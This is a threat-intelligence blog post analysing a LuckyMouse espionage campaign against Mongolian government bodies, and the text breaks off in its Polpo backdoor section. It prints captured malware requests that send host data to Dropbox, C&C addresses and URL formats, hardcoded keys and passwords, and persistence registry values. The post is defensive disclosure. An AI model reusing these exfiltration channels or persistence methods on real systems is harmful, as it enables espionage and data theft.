class="mantine-Grid-col mantine-3816o2"><div class="mantine-Container-root mantine-i7qrnu" id="post" data-component="post-content"><div class="RichText_wrapper__xZRh7"><p><strong>Introduction&nbsp;</strong></p><p>This summer, Avast discovered a new APT campaign targeting government agencies and a National Data Center of Mongolia. We consider with moderate confidence based on our research that the chinese-speaking APT group LuckyMouse is behind the attack.&nbsp;</p><p>The APT group planted backdoors and keyloggers to gain long-term access to government networks and then uploaded a variety of tools that they used to perform additional activities on the compromised network such as scanning of the local network and dumping credentials. We presume that the main aim of cyber-espionage was the exfiltration of sensitive data from potentially interesting government agencies.</p><p>According to our local telemetries, we consider that the government institutions were attacked in two ways. One was through a vulnerable company who is providing services for these agencies, and the other was through an email spear-phishing with a malicious attachment – a weaponized document using CVE-2017-11882.&nbsp;</p><p>There are many tactics that are consistent with other reports of LuckyMouse; nevertheless, we are also seeing some previously undocumented tactics indicating that the actors have updated their toolset with Polpo and LuckyBack backdoors. Our analysis below will highlight those new tactics.&nbsp;</p><p><strong>Attribution &amp; Clusterization</strong></p><p>We base our presumption that this campaign was led by the LuckyMouse APT group on the tooling that we found during the investigation of this campaign, most of them having previously been attributed to LuckyMouse by other researchers[<a href="https://securelist.com/luckymouse-hits-national-data-center/86083/">1</a>][<a href="https://securelist.com/luckymouse-ndisproxy-driver/87914/">2</a>][<a href="https://unit42.paloaltonetworks.com/emissary-panda-attacks-middle-east-government-sharepoint-servers/">3</a>].</p><p>In 2018, Kaspersky Labs released two blog posts about LuckyMouse targeting a national data center containing Asian government resources. Their blog posts described several tool sets such as network filtering driver NDISProxy, weaponized documents with CVE-2017-11882 (Microsoft Office Equation Editor, widely used by Chinese-speaking actors), and Earthworm tunneler. They also described a DLL sideloading technique abusing legitimate applications from Symantec (<em>IntgStat.exe</em>). This is a legitimate application that loads a DLL <em>pcalocalresloader.dll</em>. By sideloading their own version <em>pcalocalresloader.dll</em>, they load HyperBro RAT from a compressed and encrypted file<em> thumbs.db</em>. While some of the tools that were used were publicly known tools that are available on the internet, the group also developed their own tools, including a rootkit[<a href="https://securelist.com/luckymouse-hits-national-data-center/86083/">1</a>][<a href="https://securelist.com/luckymouse-ndisproxy-driver/87914/">2</a>].</p><p>In April 2019, PaloAlto Networks released a blogpost about LuckyMouse. According to the post, the group installed webshells on a SharePoint server to compromise Government Organizations in the Middle East. Similarly, the group used several publicly known and available tools (such as mimikatz, curl, ntbscan). But what got our attention was the fact that the same HyperBro RAT was used in the campaign we were analyzing. The APT attack we analyzed also used a DLL sideloading technique, although with different executables. The executable used was a Symantec application <em>thinprobe.exe</em> that loads <em>thinhostprobedll.dll</em>. This DLL was then used to sideload <em>thumb.db</em> that contained encrypted and compressed HyperBro[<a href="https://unit42.paloaltonetworks.com/emissary-panda-attacks-middle-east-government-sharepoint-servers/">3</a>].</p><p>We’ve also discovered a Polpo backdoor in the network belonging to the National Data Center of Mongolia. This backdoor was accompanied by samples that are known to be used by the LuckyMouse group which lead us to the conclusion that this backdoor is a new addition into LuckyMouse’s toolkit. We also observed more common tools, e.g. VMProtect-obfuscated Earthworm tunneler, a custom installer dropping NDISProxy network filtering driver, and various network scanners.</p><p><strong>Infection Chain</strong></p><p>We observed that this APT group was also targeting an unknown company that was providing services to government institutions in East Asia. The group infiltrated the company’s computers and managed to harvest credentials belonging to the company’s email accounts. Unfortunately, we haven’t been able to identify which attack vector was used in this infiltration. These credentials were then used to send emails from the hacked company’s email accounts to the government officials. While we were unable to recover the whole email, we’ve managed to recover the email’s header. The header indicates that these emails were asking the recipient to update a firmware, i.e. launch a self-extracting 7-zip archive attached to this email.</p><p>Date: Sun, 28 Jun 2020 20:43:08 +0800 (ULAT)&nbsp;<br>Subject: Re: Perform a firmware update on the server</p><p>XXXXXX_update.exe&nbsp;</p><p>(sha256:2D2EA3002C367684F21AD08BDC9B5079EBDEE08B6356AC5694EFA139D4C6E60D)</p><p>This archive drops three already familiar files – Symantec’s <em>thinprobe.exe</em>, malicious <em>thinhostprobedll.dll</em>, and <em>thumb.db</em>. The malicious DLL is used for DLL sideloading, decrypting and decompressing <em>thumb.db</em> and finally loading its processed content – a HyperBro RAT . This backdoor has also been reported on by <a href="https://securelist.com/luckymouse-hits-national-data-center/86083/">Kaspersky[1]</a> and <a href="https://unit42.paloaltonetworks.com/emissary-panda-attacks-middle-east-government-sharepoint-servers/">PaloAlto Networks[3]</a>, the latter providing an extensive description of the HyperBro RAT.</p></div><div class="mantine-Container-root mantine-1yr9cmk"><picture id="the-picture"><source srcSet="https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_large/public/2024-06/graph_dark.png.webp?itok=ctLjdMol 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_large_2x/public/2024-06/graph_dark.png.webp?itok=f0cIHnlR 2x" media="(min-width: 1020px)"/><source srcSet="https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_medium/public/2024-06/graph_dark.png.webp?itok=RjwYl0cX 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_medium_2x/public/2024-06/graph_dark.png.webp?itok=qjW54nak 2x" media="(min-width: 720px)"/><source srcSet="https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_small/public/2024-06/graph_dark.png.webp?itok=xZKkQ35x 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_small_2x/public/2024-06/graph_dark.png.webp?itok=24Hd2_gy 2x" media="(min-width: 420px)"/><img src="https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_small/public/2024-06/graph_dark.png.webp?itok=xZKkQ35x" width="100%" height="unset" alt="Figure 1: Overview of infection vector" class="mantine-q24tb8"/></picture><div class="mantine-Text-root picture-caption mantine-rpndsl">Figure 1: Overview of infection vector</div></div><div class="RichText_wrapper__xZRh7"><p><strong>Toolset</strong></p><p>In this following section we describe a tool set we found on the victim’s PC, used by the APT group for cyber-espionage and lateral movement through the network. We could divide these tools into three categories:</p><ul><li>Helpers: ServiceInstaller, ShellCodeExecutor, DataExtractor 1/2, Information Collector</li><li>Remote access: StartServiceTool, Korplug, LuckyBack, BlueTraveller, Polpo</li><li>Publicly available tools: UAC bypass tool, port scanners, password dumpers, FRP, Earthworm tunneler</li></ul><p>In detail, we found the following tools:</p><h2><strong>StartServiceTool</strong></h2><p>This tool installs <em>wcm.dll</em> into <em>%WINDIR%\system32</em>, a registry record</p><p>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WindowsConnections Manager</p><p>is created with the following values:</p><p>Description: Makes automatic connect/disconnect decisions based on the network connectivity options currently available to the PC and enables management of network connectivity based on Group Policy settings.</p><p>DisplayName: Windows Connections Manager</p><p>ServiceDll: C:\Windows\system32\wcm.dll.</p><p>This effectively creates a new service. The dropped binary is a 32-bit service DLL that has two parts – embedded DLL, and mmLoader (<a href="http://tishion.github.io/mmLoader/">http://tishion.github.io/mmLoader/</a>), a loader that bypasses the windows loader.</p><p>The final payload DLL is written in GO and contains a single export named “Interface“. This function expects 4 arguments consisting of two strings and their corresponding lengths. The string values specify the victim ID and the Dropbox API key to use. The API key is passed in as an RC4 encrypted + base64 encoded value.<br>The hardcoded decryption key is “0000111122223333“. The DLL additionally contains a default API key which appears to be for the authors test account.</p><p>Initially, it tries do download a file from Dropbox via the HTTP API:</p><p>POST /2/files/download HTTP/1.1<br>Host: content.dropboxapi.com<br>User-Agent: Go-http-client/1.1<br>Content-Length: 0<br>Authorization: Bearer [snipped]<br>Dropbox-Api-Arg: {“path”: “/infos/000000.txt”}<br>Accept-Encoding: gzip</p><p>If the server responds with a file, it tries to upload a file with a timestamp and a hostname onto Dropbox:</p><p>POST /2/files/upload HTTP/1.1<br>Host: content.dropboxapi.com<br>User-Agent: Go-http-client/1.1<br>Content-Length: 36<br>Authorization: Bearer [snipped]<br>Content-Type: application/octet-stream<br>Dropbox-Api-Arg: {“path”: “/infos/116a0d.txt”,”mode”: “overwrite”,”autorename”: true,”mute”: false,”strict_conflict”: false}<br>Accept-Encoding: gzip</p><p>%currentDate% %currentTime%##%hostname%</p><p>Afterwards, a C&amp;C request-response loop is started. Based on the response from the C&amp;C server, one of the following commands is executed: download files, upload files, sleep, quit, or execute commands on a command line. See the following diagram for a detailed flow, keep in mind that all download/upload are using the aforementioned Dropbox API:</p></div><div class="mantine-Container-root mantine-1yr9cmk"><picture id="the-picture"><source srcSet="https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_large/public/2024-06/pasted%20image%200_20.png.webp?itok=6c767pnB 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_large_2x/public/2024-06/pasted%20image%200_20.png.webp?itok=pipbVt-N 2x" media="(min-width: 1020px)"/><source srcSet="https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_medium/public/2024-06/pasted%20image%200_20.png.webp?itok=vhd3NbWi 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_medium_2x/public/2024-06/pasted%20image%200_20.png.webp?itok=83G8UUy6 2x" media="(min-width: 720px)"/><source srcSet="https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_small/public/2024-06/pasted%20image%200_20.png.webp?itok=idPAQH2a 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_small_2x/public/2024-06/pasted%20image%200_20.png.webp?itok=wbr2tNfH 2x" media="(min-width: 420px)"/><img Overview of detailed execution flow" class="mantine-q24tb8"/></picture><div class="mantine-Text-root picture-caption mantine-rpndsl">Figure 2: Overview of detailed execution flow</div></div><div class="RichText_wrapper__xZRh7"><h2><strong>ServiceInstaller</strong></h2><p>We assume that this installer is intended to be executed by one of the aforementioned backdoors as it requires command-line parameters for its successful execution:</p></div><div class="mantine-Container-root mantine-1yr9cmk"><picture id="the-picture"><source srcSet="https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_large/public/2024-06/Screenshot%202024-06-24%20at%2011.14.41%E2%80%AFAM.png.webp?itok=P3ikbYIq 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_large_2x/public/2024-06/Screenshot%202024-06-24%20at%2011.14.41%E2%80%AFAM.png.webp?itok=CtstgIfR 2x" media="(min-width: 1020px)"/><source srcSet="https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_medium/public/2024-06/Screenshot%202024-06-24%20at%2011.14.41%E2%80%AFAM.png.webp?itok=Sb7-DO8b 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_medium_2x/public/2024-06/Screenshot%202024-06-24%20at%2011.14.41%E2%80%AFAM.png.webp?itok=jlIb9SVi 2x" srcSet="https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_small/public/2024-06/Screenshot%202024-06-24%20at%2011.14.41%E2%80%AFAM.png.webp?itok=LC-puC9g 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_small_2x/public/2024-06/Screenshot%202024-06-24%20at%2011.14.41%E2%80%AFAM.png.webp?itok=vSCH0kUR 2x" media="(min-width: 420px)"/><img height="unset" alt="" class="mantine-q24tb8"/></picture></div><div class="RichText_wrapper__xZRh7"><p>At first, security descriptors of both <em>%windir%\system32\ </em>and <em>%windir%\system32\drivers\ </em>changes to allow the current user to copy files to these locations. Then the installer copies a service executable to <em>%windir%\system32\</em> under a randomly generated name (4 alphanumeric characters).</p><p>Depending on whether a service named <em>DFS Replication</em> already exists in&nbsp;</p><p>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost netsvcs,</p><p>a new service called <em>DFS Replication </em>(if it does not exist) or <em>IAS Jet Database Access Service %number%</em> is created. More specifically, its parameters are:</p><p>Description: <em>“Configures Internet Authentication Service (IAS). If this service is stopped, the remote network access that requires user authentication will be unavailable. If this service is disabled, any services that explicitly depend on it will fail to start or (Retail) Replicates files among multiple PCs keeping them in sync. On Client, it is used to roam folders between PCs; on the server, it is used to provide high availability and local access across a wide area network (WAN). If the service is stopped, file replication does not occur, and the files on the server become out-of-date. If the service is disabled, any services that explicitly depend on it will not start.”</em><br>DisplayName: DFS Replication/IAS Jet Database Access Service %number%<br>ServiceDll: C:\Windows\system32\&lt;4 random alphanumeric characters&gt;.dll.<br>Tag: 0<br>Security: 0</p><h2><strong>ShellCodeExecutor</strong></h2><p>This utility takes hex-encoded shellcode as an argument and then proceeds to execute it. The code responsible for decoding and unpacking can be seen below:</p></div><div class="mantine-Container-root mantine-1yr9cmk"><picture id="the-picture"><source srcSet="https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_large/public/2024-06/pasted%20image%200-1_9.png.webp?itok=ZnZYFm7r 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_large_2x/public/2024-06/pasted%20image%200-1_9.png.webp?itok=4i9Agu2C 2x" media="(min-width: 1020px)"/><source srcSet="https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_medium/public/2024-06/pasted%20image%200-1_9.png.webp?itok=K9Z-wfU8 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_medium_2x/public/2024-06/pasted%20image%200-1_9.png.webp?itok=VALrHg_d 2x" media="(min-width: 720px)"/><source srcSet="https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_small/public/2024-06/pasted%20image%200-1_9.png.webp?itok=nWTsGRKJ 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_small_2x/public/2024-06/pasted%20image%200-1_9.png.webp?itok=HdQYhqW9 2x" media="(min-width: 420px)"/><img src="https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_small/public/2024-06/pasted%20image%200-1_9.png.webp?itok=nWTsGRKJ" width="100%" height="unset" alt="Figure 3: Decoding algorithm and executing decoded payload in allocated memory" class="mantine-q24tb8"/></picture><div class="mantine-Text-root picture-caption mantine-rpndsl">Figure 3: Decoding algorithm and executing decoded payload in allocated memory</div></div><div class="RichText_wrapper__xZRh7"><p>While we weren’t able to reconstruct which stage this executor was used, we were able to recover its parameter that corresponds to a hex-encoded metasploit-generated shellcode (reverse HTTP proxy – <a href="https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/block/block_reverse_https_proxy.asm">Github</a> configured to connect to URL <em>oss.chrome-upgrade[.]com</em> (202.59.9[.]58). We suspect that the threat actors used the shellcode just to retrieve and execute a further stage from the C&amp;C server.</p><h2><strong>DataExtractor 1</strong></h2><p>This tool can be used to gather potentially sensitive documents with <em>pdf</em>,<em> ppt</em>,<em> xls</em>, and <em>doc</em> file extensions. It recursively scans all connected drives for such documents that were modified in 2020 and later. Gathered documents are packed using Winrar and the archive is protected with a password <em>“zaq1xsw@cde3</em>”. This archive will be then saved to <em>C:\MSBuild\NVIDIA\ </em>under a filename <em>CRYPTO-%computerName%-%number_value%.SYS</em>. This scan is repeated every 20 minutes. If this tool is launched a second time (e.g. after reboot), only documents that were modified in the last 24 hours are gathered.</p><p>After each run, a file <em>%windir%\system32\igfxme.vbs </em>is executed. Since this tool did not contain any exfiltration-related functionality, we presume that this script is used to exfiltrate the archive from the computer to a C&amp;C. Unfortunately, we were not able to recover this script.</p><h2><strong>DataExtractor 2</strong></h2><p>This binary is a simple filescanner that is provided with a list of file extensions, a list of directories, and date boundaries as parameters. Every directory from the list is searched for files with a given file extension. If such files are found and their modification date is within the provided date boundaries (in UTC), their full paths are written down into the output file. These paths are delimited by Windows line delimiters and they are encoded in 16-bit Unicode.</p><p>Below you will see a part of an error message, providing us the information about how this utility is used:</p><p><em>T040ClientLite.exe suffix .txt,.xls scanDirs E:\\test,E:\\test1 output E:\\test\\output.txt startEditDate 2020/04/26 endEditDate 2020/04/27</em></p><p>More generally, the command’s format is:</p><p><em>T040ClientLite.exe suffix &lt;file extensions&gt; scanDirs &lt;directories&gt; output &lt;output file&gt; startEditDate &lt;date&gt; endEditDate &lt;date&gt;</em></p><h2><strong>Information Collector</strong></h2><p>The Information Collector focuses on removable drives. If no such drives are connected, its execution is terminated. The collector fingerprints those drives (serial number, vendor ID, product ID), encrypts this data with a 64 byte XOR key, and stores it onto the system drive as hidden files. More specifically, it uses the following directories:</p><p><em>C:\MSBuild\Resources\Format\S-1-1</em> (encrypted files)</p><p><em>C:\MSBuild\Resources\Format\S-1-0\S-1-0-0 (unencrypted temporary files, deleted after encryption)</em></p></div><div class="mantine-Container-root mantine-1yr9cmk"><picture id="the-picture"><source srcSet="https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_large/public/2024-06/pasted%20image%200-2_5.png.webp?itok=Dkmnt8U5 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_large_2x/public/2024-06/pasted%20image%200-2_5.png.webp?itok=UB-PKObF 2x" media="(min-width: 1020px)"/><source srcSet="https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_medium/public/2024-06/pasted%20image%200-2_5.png.webp?itok=x_6XjuCY 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_medium_2x/public/2024-06/pasted%20image%200-2_5.png.webp?itok=Bm2qub73 2x" media="(min-width: 720px)"/><source srcSet="https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_small/public/2024-06/pasted%20image%200-2_5.png.webp?itok=ITBvJj_- 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_small_2x/public/2024-06/pasted%20image%200-2_5.png.webp?itok=sV01F9Is 2x" media="(min-width: 420px)"/><img src="https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_small/public/2024-06/pasted%20image%200-2_5.png.webp?itok=ITBvJj_-" width="100%" height="unset" alt="Figure 4: Sample enumerate drives, checking their type with GetDriveTypeA" class="mantine-q24tb8"/></picture><div class="mantine-Text-root picture-caption mantine-rpndsl">Figure 4: Sample enumerate drives, checking their type with GetDriveTypeA</div></div><div class="RichText_wrapper__xZRh7"><p><em>It ensures its persistence by adding itself into Run (SOFTWARE\Microsoft\Windows\CurrentVersion\Run) registry key under AvpSecurity.</em></p><p>Interestingly, it contains many unused functions using command-line tools such as: systeminfo, arp, ipconfig, netstat, and tasklist. It also supports archiving the collected information using WinRAR with a hard-coded password “1qaz@WSX”. The sample has no networking capabilities. It primarily serves for collecting the information and transferring the gathered information using removable drives between the machines in the network.</p><p>Moreover, the particular sample we analyzed contained a bug in the drives’ enumeration routine that made it virtually useless as it hampered all the sample’s functionality.</p><h2><strong>RAT</strong></h2><h3><strong>Korplug (PlugX)</strong></h3><p>Korplug (PlugX) is a well-known Remote Access Trojan associated with Chinese speaking attackers and it has been used in a large number of targeted attacks since 2012[<a href="https://www.welivesecurity.com/2014/11/12/korplug-military-targeted-attacks-afghanistan-tajikistan/">4</a>]. It uses DLL side-loading to load itself into the memory through legitimate applications. It helps it stay unnoticed by any security product. Korplug is a fully featured RAT, with capabilities such as file uploads, downloads, keystroke logging, webcam control and access to a remote cmd.exe shell.&nbsp;</p><p>In our case, we observed that it was loaded through an application provided by ESET called unsecapp.exe that was signed with a valid, but expired certification. After executing unsecapp.exe, it loads a malicious DLL <em>http_dll.dll</em>. This DLL, in turn, decrypts <em>http_dll.dat</em> with a custom algorithm, yielding Korplug which is then loaded into the memory and executed. Unfortunately, we were not able to trace the RAT back to the original payload that dropped and executed these files.</p><p>Address of C&amp;C servers:&nbsp;</p><p>web[.]microlynconline[.]com:80<br>home[.]microlynconline[.]com:8000<br>help[.]microlynconline[.]com:443<br>host[.]microlynconline[.]com:53</p><h2><strong>Backdoors</strong></h2><p>We found three different backdoors in the government office network, two of which, PolPo and LuckyBack, were never seen in any previous campaign. Polpo also hits the National Data Center, and the two others, BlueTraveller and LuckyBack, only hit the government office network.</p><h3><strong>LuckyBack</strong></h3><p>LuckyBack collects the computer’s fingerprint, at first, and then tries to establish a communication with the C&amp;C server (45.77.55[.]145). Once the communication is established, the backdoor starts listening for commands. It is capable of: starting a remote shell, file manipulation (move, read, write, execute, get file size), keylogging, and screen capturing.</p><h4><strong>Technical:</strong></h4><p>At first, the used code page is retrieved by calling <em>chcp</em>, a command providing the keyboard and character set information, on the system drive.</p><p>The first request on the C&amp;C server “registers” the device by providing its fingerprint. Namely, the fingerprint is constructed from: PID, Windows version/build number, CPU architecture, username, user privileges, hostname, IP address, code page, and RDP session ID.</p><p>If the server accepts the registration, it responds with the PID and a simple string “OK”. Afterwards, a simple request-response C&amp;C loop is started, and commands and their corresponding numbers are displayed in the table below:</p></div><div class="mantine-Container-root mantine-1yr9cmk"><picture id="the-picture"><source srcSet="https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_large/public/2024-06/Screenshot%202024-06-24%20at%2011.16.12%E2%80%AFAM.png.webp?itok=rkBb9MIg 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_large_2x/public/2024-06/Screenshot%202024-06-24%20at%2011.16.12%E2%80%AFAM.png.webp?itok=o7mRzH5Y 2x" media="(min-width: 1020px)"/><source srcSet="https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_medium/public/2024-06/Screenshot%202024-06-24%20at%2011.16.12%E2%80%AFAM.png.webp?itok=qkIFjWso 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_medium_2x/public/2024-06/Screenshot%202024-06-24%20at%2011.16.12%E2%80%AFAM.png.webp?itok=2sElrukP 2x" media="(min-width: 720px)"/><source srcSet="https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_small/public/2024-06/Screenshot%202024-06-24%20at%2011.16.12%E2%80%AFAM.png.webp?itok=nDreIZHV 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_small_2x/public/2024-06/Screenshot%202024-06-24%20at%2011.16.12%E2%80%AFAM.png.webp?itok=565sIU4S 2x" media="(min-width: 420px)"/><img src="https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_small/public/2024-06/Screenshot%202024-06-24%20at%2011.16.12%E2%80%AFAM.png.webp?itok=nDreIZHV" width="100%" height="unset" alt="" class="mantine-q24tb8"/></picture></div><div class="RichText_wrapper__xZRh7"><h3><strong>BlueTraveller</strong></h3><p>This backdoor is simpler in terms of commands than the previous one. It accepts just four commands: exit, upload, download, and execute on the command line. Nevertheless, it uses two layers of C&amp;C servers, meaning that the first request is on the first layer, and it yields an IP address of a C&amp;C server from the second layer. Afterwards, the request-response C&amp;C loop uses the second layer. If the backdoor receives a command for the command line, the output from the console is encrypted with AES-256 and sent back to the second-layer C&amp;C server.</p><p>The binary itself has its strings encrypted with RC4, using a hardcoded key “L!Q@W#E$R%T^Y&amp;U*A|}t~k”. Among these strings, we may find the address of the first-layer C&amp;C server and the user agent that should be used for these requests. Our sample tried to contact <a href="https://decoded.avast.io/luigicamastra/apt-group-targeting-governmental-agencies-in-east-asia/blank">http://go.vegispaceshop[.]org/shop.htm</a>. The response seems to be pretty inconspicuous at first glance. But once we have a look more closely, we see that many lines are followed by a mixture of tabs and spaces,which is rather fishy indeed. And surprisingly this is where the IP address of the second C&amp;C layer hides!</p></div><div class="mantine-Container-root mantine-1yr9cmk"><picture id="the-picture"><source srcSet="https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_large/public/2024-06/pasted%20image%200-3_3.png.webp?itok=YbDlWU-q 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_large_2x/public/2024-06/pasted%20image%200-3_3.png.webp?itok=gY262O1B 2x" media="(min-width: 1020px)"/><source srcSet="https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_medium/public/2024-06/pasted%20image%200-3_3.png.webp?itok=SuECBVm0 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_medium_2x/public/2024-06/pasted%20image%200-3_3.png.webp?itok=aI6D7RDJ 2x" media="(min-width: 720px)"/><source srcSet="https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_small/public/2024-06/pasted%20image%200-3_3.png.webp?itok=AanFe0u5 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_small_2x/public/2024-06/pasted%20image%200-3_3.png.webp?itok=L9Dv_CbZ 2x" media="(min-width: 420px)"/><img src="https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_small/public/2024-06/pasted%20image%200-3_3.png.webp?itok=AanFe0u5" width="100%" height="unset" alt="Figure 5: Response from first layer of C&amp;C server" class="mantine-q24tb8"/></picture><div class="mantine-Text-root picture-caption mantine-rpndsl">Figure 5: Response from first layer of C&amp;C server</div></div><div class="mantine-Container-root mantine-1yr9cmk"><picture id="the-picture"><source srcSet="https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_large/public/2024-06/pasted%20image%200-4_0.png.webp?itok=-icyy2Nk 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_large_2x/public/2024-06/pasted%20image%200-4_0.png.webp?itok=n2aND08Q 2x" media="(min-width: 1020px)"/><source srcSet="https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_medium/public/2024-06/pasted%20image%200-4_0.png.webp?itok=gKR5c1WE 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_medium_2x/public/2024-06/pasted%20image%200-4_0.png.webp?itok=jFG5u5wn 2x" media="(min-width: 720px)"/><source srcSet="https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_small/public/2024-06/pasted%20image%200-4_0.png.webp?itok=qcYJdIDI 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_small_2x/public/2024-06/pasted%20image%200-4_0.png.webp?itok=86J1cuLv 2x" media="(min-width: 420px)"/><img src="https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_small/public/2024-06/pasted%20image%200-4_0.png.webp?itok=qcYJdIDI" width="100%" height="unset" alt="Figure 6: Script which decrypts the white spaces from the html response" class="mantine-q24tb8"/></picture><div class="mantine-Text-root picture-caption mantine-rpndsl">Figure 6: Script which decrypts the white spaces from the html response</div></div><div class="RichText_wrapper__xZRh7"><p>The BlueTraveller uses the same scheme for encryption – AES-256 with a key derived from a string that is hashed with SHA-256, providing the IV and the key. The first usage of this encryption is in the first request to the second-layer C&amp;C. For this first request, the key is derived from a string “<em>0304276cf4f31345“</em>. The key is then used to encrypt the generated GUID and the computer’s hostname which are then Base64-encoded and used to generate the request URL:&nbsp;&nbsp;</p><p><em>http://&lt;second_layer_C&amp;C&gt;/home/&lt;rand number&gt;/&lt;enc_length&gt;/&lt;Base64 data&gt;.</em></p><p>After this request is executed, commands are retrieved from:</p><p><em>http://&lt;second_layer_C&amp;C&gt;/index.htm.</em></p><p>The obtained data is encrypted with AES-256, using the aforementioned approach with GUID as a base-string for the key-derivation procedure. Each response also contains the random number that was sent in the first second-layer request. The malware checks whether the received number matches the one it sent; in case of a mismatch, the command is discarded. If a command for the command line is received, the output of the executed command (AES-256 encrypted, using the same key as the previous response, and Base64 encoded) is sent to</p><p>http://&lt;second_layer_C&amp;C&gt;/help/&lt;rand number&gt;/&lt;enc_length&gt;/&lt;Base64 data&gt;.</p><h3><strong>Polpo</strong></h3><p>Polpo is a backdoor that we’ve been seeing in the wild since 2018. It supports around 15 different commands including information collection and exfiltration, file transfer, and proxy connections.</p></div><div class="mantine-Container-root mantine-1yr9cmk"><picture id="the-picture"><source srcSet="https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_large/public/2024-06/Screenshot%202024-06-24%20at%2011.17.53%E2%80%AFAM.png.webp?itok=U_-OecMZ 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_large_2x/public/2024-06/Screenshot%202024-06-24%20at%2011.17.53%E2%80%AFAM.png.webp?itok=iBUNhI5F 2x" media="(min-width: 1020px)"/><source srcSet="https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_medium/public/2024-06/Screenshot%202024-06-24%20at%2011.17.53%E2%80%AFAM.png.webp?itok=3UvPQqtd 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_medium_2x/public/2024-06/Screenshot%202024-06-24%20at%2011.17.53%E2%80%AFAM.png.webp?itok=dkSRHqIX 2x" media="(min-width: 720px)"/><source srcSet="https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_small/public/2024-06/Screenshot%202024-06-24%20at%2011.17.53%E2%80%AFAM.png.webp?itok=CXNvBHFk 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_small_2x/public/2024-06/Screenshot%202024-06-24%20at%2011.17.53%E2%80%AFAM.png.webp?itok=c_quDen8 2x" media="(min-width: 420px)"/><img src="https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_small/public/2024-06/Screenshot%202024-06-24%20at%2011.17.53%E2%80%AFAM.png.webp?itok=CXNvBHFk" width="100%" height="unset" alt="" class="mantine-q24tb8"/></picture></div><div class="RichText_wrapper__xZRh7"><p>Base64-encoded addresses of C&amp;C servers are hard-coded in the binary</p><h4><strong>Polpo – Communication</strong></h4><p>The backdoor mimics the HTTP protocol to blend with the normal traffic. The transferred data is encrypted with AES and encoded into Base64 then sent as a part of fake HTML content.&nbsp;</p></div><div class="mantine-Container-root mantine-1yr9cmk"><picture id="the-picture"><source srcSet="https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_large/public/2024-06/pasted%20image%200-5.png.webp?itok=cRaPiHhy 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_large_2x/public/2024-06/pasted%20image%200-5.png.webp?itok=ocTB3660 2x" media="(min-width: 1020px)"/><source 